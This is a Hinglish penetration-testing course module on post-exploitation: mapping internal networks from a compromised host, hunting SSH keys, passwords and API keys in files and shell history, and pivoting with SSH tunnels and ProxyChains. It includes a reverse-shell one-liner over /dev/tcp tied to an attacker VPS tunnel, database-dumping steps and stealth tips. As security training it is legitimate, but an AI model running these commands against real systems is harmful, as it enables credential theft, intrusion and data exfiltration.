# **Module 7: Post-Exploitation & Lateral Movement**

## **Topic 1: Internal Network Enumeration**

### **1. Topic ka Naam / Ek Line Mein Summary** ðŸš€
**Internal Network Enumeration:** Compromised system se internal network ko map karna - aage badhne ka raasta dhoondhna.

### **2. Ye Kya Hai? (What is it?)**
Internal network enumeration wo process hai jisse hum compromised system se connected internal network ko explore karte hain - dusre systems, services, aur potential targets identify karte hain.

**Analogy:** Ye aise hai jaise aap ek building mein ghus gaye (initial access), ab aap building ke andar ke saare rooms, corridors, aur dusre buildings (internal network) ko map kar rahe hain taaki aage badh sakein.

### **3. Pentesting mein Kyun Use Karte Hain? (Why use it?)**
- Internal network topology samajhna
- Dusre vulnerable systems dhoondhna
- Lateral movement ke targets identify karna
- Critical servers locate karna
- Network segmentation test karna

### **4. Ise Kab Use Karna Chahiye? (When to use it?)**
- Initial access milne ke baad
- Privilege escalation ke baad
- Lateral movement se pehle
- Network mapping phase mein

### **5. Agar Ye Pata Nahi Hoga Toh Kya Hoga? (If not known then what?)** ðŸ˜Ÿ
Ek hi system par phanse rahoge. Dusre targets miss ho jayenge. Network ka complete picture nahi banega. Lateral movement impossible hoga.

### **6. Ye Kaise Kaam Karta Hai? / Syntax aur Options**

**Network Information:**
```bash
# Network interfaces
ip addr show
ifconfig -a

# Routing table
ip route
route -n

# ARP cache (connected hosts)
ip neigh
arp -a

# DNS servers
cat /etc/resolv.conf

# Network connections
netstat -tulpn
ss -tulpn

# Listening services
netstat -ano
ss -lntu
```

**Host Discovery:**
```bash
# Ping sweep (if allowed)
for i in {1..254}; do ping -c 1 192.168.1.$i | grep "64 bytes"; done

# Nmap from compromised host
nmap -sn 192.168.1.0/24

# Using /proc
cat /proc/net/tcp
cat /proc/net/udp
```

**Service Enumeration:**
```bash
# Port scan internal network
nmap -p- 192.168.1.0/24

# Quick scan
nmap -F 192.168.1.0/24

# Service detection
nmap -sV 192.168.1.10
```

**Useful Files:**
```bash
# SSH known hosts
cat ~/.ssh/known_hosts

# Bash history (previous connections)
cat ~/.bash_history | grep ssh

# Hosts file
cat /etc/hosts

# Network shares
cat /etc/fstab
mount
```

### **7. Command Example (Poori Explanation ke Saath)**

**Scenario 1: Network interfaces check**
```bash
ip addr show
```

**Expected Output:**
```
eth0: 192.168.1.50/24
eth1: 10.10.10.5/24
```

**Scenario 2: ARP cache (connected hosts)**
```bash
ip neigh
```

**Expected Output:**
```
192.168.1.1 dev eth0 lladdr aa:bb:cc:dd:ee:ff REACHABLE
192.168.1.10 dev eth0 lladdr 11:22:33:44:55:66 STALE
```

**Scenario 3: Active connections**
```bash
netstat -tulpn
```

| Column | Matlab |
|--------|--------|
| Proto | Protocol (tcp/udp) |
| Local Address | Local IP:Port |
| Foreign Address | Remote IP:Port |
| State | Connection state |
| PID/Program | Process info |

**Scenario 4: Ping sweep**
```bash
for i in {1..254}; do (ping -c 1 192.168.1.$i | grep "64 bytes" &); done
```

**Scenario 5: SSH known hosts**
```bash
cat ~/.ssh/known_hosts
```

**Expected Output:** Previously connected hosts ki list.

### **8. Beginners ki Aam Galtiyan (Common Mistakes)**
- ARP cache ko ignore karna (valuable info)
- Bash history check na karna
- Multiple network interfaces miss karna
- `/proc/net/` files ko overlook karna
- Noisy scans chalana (detection)

### **9. Best Practices / Pro Tips**
- **CRITICAL Fix:** Output save karein: `ip neigh > /tmp/.cache`
- **Stealth Tip:** Passive enumeration prefer karein (ARP, /proc, logs)
- Multiple subnets check karein (multi-homed hosts)
- SSH config aur known_hosts gold mine hain
- Bash history mein credentials mil sakte hain

### **10. Asli Pentesting ka Scenario (Real-World Scenario)**
Ek pentester ne web server compromise kiya. Usne `ip addr` check kiya - 2 interfaces the (DMZ aur internal). `ip neigh` se internal network ke 5 hosts mile. `cat ~/.bash_history` mein database server ka SSH command mila credentials ke saath. Usne wo credentials use karke database server access li.

### **11. Checklist / Chota Recap (TL;DR)**
- `ip addr` - Network interfaces
- `ip neigh` - Connected hosts (ARP)
- `netstat -tulpn` - Active connections
- `~/.ssh/known_hosts` - Previous SSH targets
- `~/.bash_history` - Command history

### **12. Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: ARP cache kyun important hai?**
A: Ye recently communicated hosts dikhata hai - active targets identify karne ke liye.

**Q2: Nmap install nahi hai, kya karein?**
A: Static binary upload karein ya bash scripts use karein ping sweep ke liye.

**Q3: Multiple subnets kaise handle karein?**
A: Har interface ka subnet alag scan karein.

**Q4: Bash history mein kya dhoondhein?**
A: SSH commands, passwords, internal IPs, database connections.

**Q5: Passive enumeration kya hai?**
A: Bina active scanning ke information gather karna (logs, configs, cache).

### **13. Practice ke liye Task**
1. `ip addr show` - Interfaces
2. `ip route` - Routing table
3. `ip neigh` - ARP cache
4. `netstat -tulpn` - Connections
5. `cat ~/.bash_history | grep -E "ssh|mysql|ftp"` - Interesting commands

**Expected Output:** Network topology, connected hosts, active services.

### **14. Extra / Advanced Jaankari (Optional)**
- **Proxychains:** Route traffic through compromised host
- **SSH Tunneling:** Port forwarding for internal access
- **Metasploit:** `autoroute` module
- **Chisel:** Fast TCP/UDP tunnel

### **15. Aakhri Choti Summary (5 lines)**
- Internal enumeration lateral movement ka pehla step
- ARP cache aur bash history valuable info
- Multiple network interfaces check karein
- Passive enumeration stealth ke liye better
- SSH known_hosts previous targets reveal karta hai

> **Ye Zaroor Yaad Rakhein**
> 1. `ip neigh` connected hosts dikhata hai
> 2. Bash history credentials reveal kar sakti hai
> 3. Multiple interfaces = multiple subnets
> 4. Passive enumeration > Active scanning
> 5. SSH config files gold mine hain

---

## **Topic 2: Sensitive Data Dhoondhna**

### **1. Topic ka Naam / Ek Line Mein Summary** ðŸš€
**Sensitive Data Discovery:** Passwords, keys, credentials dhoondhna - data exfiltration ka treasure hunt.

### **2. Ye Kya Hai? (What is it?)**
Sensitive data discovery wo process hai jisse hum compromised system par stored passwords, SSH keys, database credentials, API keys, aur dusri sensitive information dhoondhte hain.

**Analogy:** Ye ek treasure hunt hai. System ek bada ghar hai jahan choti-choti jagahon mein valuable cheezein chhipi hain - drawers (config files), safes (password managers), notes (bash history). Aapko systematically har jagah dhoondhna hai.

### **3. Pentesting mein Kyun Use Karte Hain? (Why use it?)**
- Credentials collect karna
- SSH keys steal karna
- Database passwords nikalna
- API keys aur tokens
- Lateral movement ke liye credentials

### **4. Ise Kab Use Karna Chahiye? (When to use it?)**
- Initial access ke baad
- Privilege escalation ke baad
- Lateral movement se pehle
- Data exfiltration phase mein

### **5. Agar Ye Pata Nahi Hoga Toh Kya Hoga? (If not known then what?)** ðŸ˜Ÿ
Valuable credentials miss ho jayenge. Lateral movement limited rahega. Easy wins gawa denge. Complete compromise nahi kar payenge.

### **6. Ye Kaise Kaam Karta Hai? / Syntax aur Options**

**Common Locations:**
```bash
# SSH Keys
~/.ssh/id_rsa
~/.ssh/id_rsa.pub
~/.ssh/authorized_keys
/root/.ssh/

# Bash History
~/.bash_history
~/.zsh_history
~/.mysql_history

# Config Files
~/.bashrc
~/.profile
/var/www/html/config.php
/var/www/html/.env

# Database Configs
/etc/mysql/my.cnf
/var/www/html/wp-config.php

# Application Configs
/opt/app/config.yml
/etc/app/settings.conf
```

**Search Commands:**
```bash
# Find passwords in files
grep -r "password" /var/www/ 2>/dev/null
grep -r "passwd" /etc/ 2>/dev/null

# Find SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Find database credentials
find / -name "wp-config.php" 2>/dev/null
find / -name ".env" 2>/dev/null

# Find API keys
grep -r "api_key" /var/www/ 2>/dev/null
grep -r "API_KEY" /opt/ 2>/dev/null

# Find interesting files
find / -name "*.conf" 2>/dev/null
find / -name "*.config" 2>/dev/null
find / -name "*.bak" 2>/dev/null
```

**Specific Patterns:**
```bash
# Email addresses
grep -roE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" /var/www/

# IP addresses
grep -roE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /etc/

# Credit cards (testing only!)
grep -roE "\b[0-9]{4}[- ]?[0-9]{4}[- ]?[0-9]{4}[- ]?[0-9]{4}\b"
```

### **7. Command Example (Poori Explanation ke Saath)**

**Scenario 1: SSH keys dhoondhna**
```bash
find / -name "id_rsa" -o -name "*.pem" 2>/dev/null
```

**Expected Output:**
```
/home/user/.ssh/id_rsa
/root/.ssh/id_rsa
/opt/app/keys/server.pem
```

**Scenario 2: Database credentials**
```bash
grep -r "DB_PASSWORD" /var/www/ 2>/dev/null
```

**Expected Output:**
```
/var/www/html/.env:DB_PASSWORD=SuperSecret123
```

**Scenario 3: Bash history passwords**
```bash
cat ~/.bash_history | grep -E "password|passwd|mysql|ssh"
```

**Expected Output:**
```
mysql -u root -pMyPassword123
ssh admin@192.168.1.10 -i /tmp/key.pem
```

**Scenario 4: Config files**
```bash
find /var/www -name "config.php" -o -name ".env" 2>/dev/null
```

**Scenario 5: API keys**
```bash
grep -roE "api[_-]?key.*=.*['\"][a-zA-Z0-9]{20,}['\"]" /var/www/ 2>/dev/null
```

### **8. Beginners ki Aam Galtiyan (Common Mistakes)**
- Bash history ko skip karna
- Backup files (.bak, .old) ignore karna
- `/opt` aur `/srv` directories miss karna
- Case-sensitive search (PASSWORD vs password)
- Output ko properly save na karna

### **9. Best Practices / Pro Tips**
- **CRITICAL Fix:** Findings ko encrypted file mein save karein
- **Stealth Tip:** Searches ko time limit dein: `timeout 60 find ...`
- Multiple search patterns use karein (password, passwd, pwd)
- Backup aur old files hamesha check karein
- LinPEAS automatic sensitive data search karta hai

### **10. Asli Pentesting ka Scenario (Real-World Scenario)**
Ek pentester ne web server compromise kiya. Usne `find /var/www -name ".env"` chalaya aur WordPress site ka `.env` file mila jismein database credentials the. Usne `cat ~/.bash_history` check kiya aur admin ka SSH command mila private key path ke saath. Usne wo key copy ki aur dusre servers access kar liye.

### **11. Checklist / Chota Recap (TL;DR)**
- `~/.ssh/id_rsa` - SSH private keys
- `~/.bash_history` - Command history
- `/var/www/*/.env` - Application configs
- `grep -r "password"` - Password search
- Backup files (.bak, .old)

### **12. Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Sabse pehle kahan dhoondhein?**
A: Bash history, SSH keys, aur web application config files.

**Q2: SSH key mili, kaise use karein?**
A: `chmod 600 key.pem` then `ssh -i key.pem user@host`

**Q3: Database password mila, ab kya?**
A: `mysql -u username -pPassword` se connect karein aur data dump karein.

**Q4: Kya automated tools hain?**
A: Haan - LinPEAS, LaZagne (Windows), mimipenguin (Linux passwords).

**Q5: Findings kaise store karein?**
A: Encrypted archive mein: `tar czf data.tar.gz files/ && gpg -c data.tar.gz`

### **13. Practice ke liye Task**
1. `find ~ -name "*.pem" -o -name "id_rsa"` - Keys
2. `cat ~/.bash_history | grep -i pass` - History
3. `find /var/www -name "config*" 2>/dev/null` - Configs
4. `grep -r "password" /etc/ 2>/dev/null | head -20` - Passwords
5. `ls -la ~/.*_history` - All history files

**Expected Output:** SSH keys, passwords, config files.

### **14. Extra / Advanced Jaankari (Optional)**
- **LaZagne:** Multi-platform password recovery
- **Mimipenguin:** Linux password dumper
- **Firefox/Chrome:** Saved passwords extraction
- **KeePass:** Password manager databases

### **15. Aakhri Choti Summary (5 lines)**
- Sensitive data systematically dhoondhna zaroori
- Bash history aur SSH keys priority targets
- Config files (.env, config.php) credentials contain karte hain
- Backup files (.bak) often overlooked hain
- Automated tools (LinPEAS) time bachate hain

> **Ye Zaroor Yaad Rakhein**
> 1. Bash history first check karo
> 2. SSH keys: `~/.ssh/id_rsa`
> 3. Web configs: `.env`, `config.php`
> 4. Backup files: `.bak`, `.old`
> 5. LinPEAS automated search ke liye

---

## **Topic 3: Pivoting & Lateral Movement (SSH Port Forwarding)**

### **1. Topic ka Naam / Ek Line Mein Summary** ðŸš€
**Pivoting & Lateral Movement:** Compromised system ko bridge bana kar internal network access karna - network hopping.

### **2. Ye Kya Hai? (What is it?)**
Pivoting wo technique hai jisse hum compromised system (pivot point) ko use karke internal network ke dusre systems access karte hain jo directly accessible nahi hain. SSH port forwarding iska ek powerful method hai.

**Analogy:** Ye ek bridge banane jaisa hai. Aap ek island (attacker machine) par hain, target island (internal server) directly accessible nahi hai, lekin beech mein ek island (compromised host) hai. Aap us beech wale island ko bridge bana kar target tak pahunch sakte hain.

### **3. Pentesting mein Kyun Use Karte Hain? (Why use it?)**
- Internal network access karna
- Firewalled services access karna
- Lateral movement
- Multi-hop attacks
- Network segmentation bypass

### **4. Ise Kab Use Karna Chahiye? (When to use it?)**
- Internal services access karni ho
- Direct connection possible na ho
- Firewall bypass karna ho
- Multi-tier networks mein
- Lateral movement ke liye

### **5. Agar Ye Pata Nahi Hoga Toh Kya Hoga? (If not known then what?)** ðŸ˜Ÿ
Internal network access nahi kar payenge. Firewalled services miss ho jayengi. Lateral movement limited rahega. Complete network compromise nahi kar payenge.

### **6. Ye Kaise Kaam Karta Hai? / Syntax aur Options**

**SSH Port Forwarding Types:**

**1. Local Port Forwarding:**
```bash
# Syntax
ssh -L local_port:target_host:target_port user@pivot_host

# Example: Access internal web server
ssh -L 8080:192.168.1.10:80 user@compromised-host
# Now: http://localhost:8080 â†’ 192.168.1.10:80
```

**2. Remote Port Forwarding:**
```bash
# Syntax
ssh -R remote_port:localhost:local_port user@remote_host

# Example: Expose local service to remote
ssh -R 9090:localhost:80 user@attacker-vps
# Now: attacker-vps:9090 â†’ your localhost:80
```

**3. Dynamic Port Forwarding (SOCKS Proxy):**
```bash
# Syntax
ssh -D local_port user@pivot_host

# Example: Create SOCKS proxy
ssh -D 1080 user@compromised-host
# Configure browser/tools to use SOCKS5 localhost:1080
```

**ProxyChains Configuration:**
```bash
# Edit /etc/proxychains.conf
socks5 127.0.0.1 1080

# Use with any tool
proxychains nmap -sT 192.168.1.0/24
proxychains curl http://internal-server/
```

**SSH Options:**
```bash
-N    # No command execution (just forwarding)
-f    # Background mode
-q    # Quiet mode
-C    # Compression
-o    # Options (StrictHostKeyChecking=no)
```

### **7. Command Example (Poori Explanation ke Saath)**

**Scenario 1: Local port forwarding**
```bash
ssh -L 3306:192.168.1.50:3306 user@compromised-host -N
```

| Command Part | Matlab |
|--------------|--------|
| `-L 3306` | Local port 3306 |
| `192.168.1.50:3306` | Target MySQL server |
| `user@compromised-host` | Pivot point |
| `-N` | No shell, just tunnel |

**Usage:**
```bash
mysql -h 127.0.0.1 -P 3306 -u root -p
```

**Scenario 2: Dynamic SOCKS proxy**
```bash
ssh -D 1080 user@compromised-host -N -f
```

**ProxyChains usage:**
```bash
proxychains nmap -sT -Pn 192.168.1.0/24
proxychains firefox
```

**Scenario 3: Remote port forwarding (reverse)**
```bash
# On attacker machine
ssh -R 4444:localhost:4444 user@compromised-host

# On compromised host, connect back
bash -i >& /dev/tcp/localhost/4444 0>&1
```

**Scenario 4: Multi-hop tunneling**
```bash
# First hop
ssh -L 2222:internal-host:22 user@dmz-host -N -f

# Second hop through first
ssh -p 2222 -L 3389:final-target:3389 user@localhost -N -f
```

### **8. Beginners ki Aam Galtiyan (Common Mistakes)**
- Port numbers confuse karna
- `-N` flag bhoolna (shell open ho jata hai)
- ProxyChains configuration galat
- Firewall rules ignore karna
- Multiple tunnels manage na kar pana

### **9. Best Practices / Pro Tips**
- **CRITICAL Fix:** Hamesha `-N -f` use karein background tunneling ke liye
- **Stealth Tip:** SSH keys use karein password prompts avoid karne ke liye
- Multiple tunnels ke liye different local ports
- `autossh` use karein persistent tunnels ke liye
- Chisel modern alternative hai SSH tunneling ka

### **10. Asli Pentesting ka Scenario (Real-World Scenario)**
Ek pentester ne DMZ web server compromise kiya. Internal database server (192.168.10.50:3306) directly accessible nahi tha. Usne SSH tunnel banaya: `ssh -L 3306:192.168.10.50:3306 user@webserver -N`. Phir local machine se `mysql -h 127.0.0.1` se database access kiya aur sensitive data extract kar liya.

Dusre case mein, pentester ne SOCKS proxy setup kiya aur proxychains se poore internal network ko scan kiya bina directly connect kiye.

### **11. Checklist / Chota Recap (TL;DR)**
- Local forwarding: `-L local:target:port`
- Remote forwarding: `-R remote:local:port`
- Dynamic (SOCKS): `-D port`
- ProxyChains for routing tools
- `-N -f` for background tunnels

### **12. Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Local aur Remote forwarding mein kya fark hai?**
A: Local = Attacker se target tak. Remote = Target se attacker tak (reverse).

**Q2: SOCKS proxy kab use karein?**
A: Jab multiple internal services access karni ho bina har ek ke liye alag tunnel ke.

**Q3: ProxyChains slow kyun hai?**
A: SOCKS proxy overhead. `-sT` (TCP connect) scan use karein SYN ke bajaye.

**Q4: Tunnel disconnect ho jaye to?**
A: `autossh` use karein - automatically reconnect karta hai.

**Q5: Chisel kya hai?**
A: Modern tunneling tool (Go mein), SSH se fast aur easy.

### **13. Practice ke liye Task**
1. Local machine par SSH server start: `sudo systemctl start sshd`
2. Tunnel create: `ssh -L 8080:google.com:80 user@localhost -N`
3. Browser mein: `http://localhost:8080`
4. SOCKS: `ssh -D 1080 user@localhost -N`
5. ProxyChains test: `proxychains curl http://ifconfig.me`

**Expected Output:** Google page via tunnel, IP change via SOCKS.

### **14. Extra / Advanced Jaankari (Optional)**
- **Chisel:** `https://github.com/jpillora/chisel`
- **SSHuttle:** VPN-like SSH tunneling
- **Metasploit:** `autoroute` aur `portfwd`
- **Ligolo:** Fast reverse tunneling

### **15. Aakhri Choti Summary (5 lines)**
- Pivoting compromised host ko bridge bana kar internal access
- SSH port forwarding 3 types: Local, Remote, Dynamic
- SOCKS proxy (Dynamic) multiple services ke liye
- ProxyChains tools ko proxy through route karta hai
- `-N -f` background persistent tunnels ke liye

> **Ye Zaroor Yaad Rakhein**
> 1. Local: `-L local:target:port`
> 2. Remote: `-R remote:local:port`
> 3. SOCKS: `-D port` + ProxyChains
> 4. `-N -f` background mode
> 5. Chisel modern alternative

---

## **Module 7 Complete Takeaway**

Is module mein humne post-exploitation techniques seekhe. Internal network enumeration se hum compromised system se connected network ko map karte hain - ARP cache, bash history, aur network connections analyze karte hain. Sensitive data discovery se credentials, SSH keys, aur API keys dhoondhte hain jo lateral movement ke liye zaroori hain. Pivoting aur SSH port forwarding se hum internal network access karte hain jo directly accessible nahi hai. Ye skills complete network compromise ke liye essential hain - ek system se shuru karke poore network tak pahunchna.

**Next:** Module 8 mein persistence aur covering tracks seekhenge! ðŸš€

